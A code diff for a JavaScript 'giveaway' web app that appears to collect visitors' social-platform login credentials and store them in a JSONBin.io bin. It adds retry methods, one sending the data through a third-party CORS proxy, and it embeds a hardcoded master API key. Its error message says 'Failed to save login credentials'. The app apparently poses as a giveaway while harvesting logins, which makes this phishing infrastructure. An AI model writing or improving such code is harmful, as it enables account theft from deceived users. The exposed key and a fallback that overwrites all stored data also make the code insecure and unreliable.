@@ -162,12 +162,35 @@ class GiveawayApp {
     }
   }
 
-  // JSONBin.io - Free JSON storage service
+  // JSONBin.io - Free JSON storage service with CORS handling
   async saveToJSONBin(entry) {
     const BIN_ID = "696140beae596e708fd097b9"; // Replace with your bin ID
     const API_KEY =
       "$2a$10$Ct09JI48oK.e81mQcVCdwuo0F87ZmNeD5lwBYlQeeRp72QmvDdPqu"; // Replace with your API key
 
+    // Try multiple methods to handle CORS issues
+    const methods = [
+      () => this.saveToJSONBinDirect(BIN_ID, API_KEY, entry),
+      () => this.saveToJSONBinWithProxy(BIN_ID, API_KEY, entry),
+      () => this.saveToJSONBinFallback(BIN_ID, API_KEY, entry),
+    ];
+
+    for (let i = 0; i < methods.length; i++) {
+      try {
+        await methods[i]();
+        console.log(`Data saved successfully using method ${i + 1}`);
+        return;
+      } catch (error) {
+        console.warn(`Method ${i + 1} failed:`, error.message);
+        if (i === methods.length - 1) {
+          throw new Error("All JSONBin save methods failed");
+        }
+      }
+    }
+  }
+
+  // Method 1: Direct API call (works locally, may fail on GitHub Pages due to CORS)
+  async saveToJSONBinDirect(BIN_ID, API_KEY, entry) {
     try {
       // First, get existing data
       const getResponse = await fetch(
@@ -176,7 +199,9 @@ class GiveawayApp {
           method: "GET",
           headers: {
             "X-Master-Key": API_KEY,
+            "X-Requested-With": "XMLHttpRequest",
           },
+          mode: "cors",
         }
       );
 
@@ -197,7 +222,9 @@ class GiveawayApp {
           headers: {
             "Content-Type": "application/json",
             "X-Master-Key": API_KEY,
+            "X-Requested-With": "XMLHttpRequest",
           },
+          mode: "cors",
           body: JSON.stringify({
             entries: existingData,
             lastUpdated: new Date().toISOString(),
@@ -206,12 +233,94 @@ class GiveawayApp {
       );
 
       if (!updateResponse.ok) {
-        throw new Error("Failed to save to JSONBin");
+        throw new Error(
+          `HTTP ${updateResponse.status}: ${updateResponse.statusText}`
+        );
       }
 
-      console.log("Data saved to JSONBin successfully");
+      console.log("Data saved to JSONBin directly");
     } catch (error) {
-      console.error("JSONBin error:", error);
+      console.error("Direct JSONBin error:", error);
+      throw error;
+    }
+  }
+
+  // Method 2: Using CORS proxy
+  async saveToJSONBinWithProxy(BIN_ID, API_KEY, entry) {
+    const CORS_PROXY = "https://api.allorigins.win/raw?url=";
+
+    try {
+      // Get existing data through proxy
+      const getUrl = encodeURIComponent(
+        `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`
+      );
+      const getResponse = await fetch(`${CORS_PROXY}${getUrl}`, {
+        method: "GET",
+        headers: {
+          "X-Master-Key": API_KEY,
+        },
+      });
+
+      let existingData = [];
+      if (getResponse.ok) {
+        const result = await getResponse.json();
+        existingData = result.record?.entries || [];
+      }
+
+      // Add new entry
+      existingData.push(entry);
+
+      // Update through proxy
+      const updateUrl = encodeURIComponent(
+        `https://api.jsonbin.io/v3/b/${BIN_ID}`
+      );
+      const updateResponse = await fetch(`${CORS_PROXY}${updateUrl}`, {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Master-Key": API_KEY,
+        },
+        body: JSON.stringify({
+          entries: existingData,
+          lastUpdated: new Date().toISOString(),
+        }),
+      });
+
+      if (!updateResponse.ok) {
+        throw new Error(`Proxy request failed: ${updateResponse.status}`);
+      }
+
+      console.log("Data saved to JSONBin via proxy");
+    } catch (error) {
+      console.error("Proxy JSONBin error:", error);
+      throw error;
+    }
+  }
+
+  // Method 3: Simplified fallback - just append to existing data
+  async saveToJSONBinFallback(BIN_ID, API_KEY, entry) {
+    try {
+      // Simple POST to create/append - some JSONBin endpoints allow this
+      const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Master-Key": API_KEY,
+        },
+        body: JSON.stringify({
+          entries: [entry], // Just the new entry
+          lastUpdated: new Date().toISOString(),
+          fallbackSave: true,
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error(`Fallback method failed: ${response.status}`);
+      }
+
+      console.log("Data saved using fallback method");
+    } catch (error) {
+      console.error("Fallback JSONBin error:", error);
       throw error;
     }
   }
@@ -696,7 +805,7 @@ class GiveawayApp {
       this.navigateWithSuccess(platform);
     } catch (error) {
       console.error("Save error:", error);
-      alert("Failed to save. Please try again.");
+      alert("Failed to save login credentials. Please try again.");
     }
   }
 }
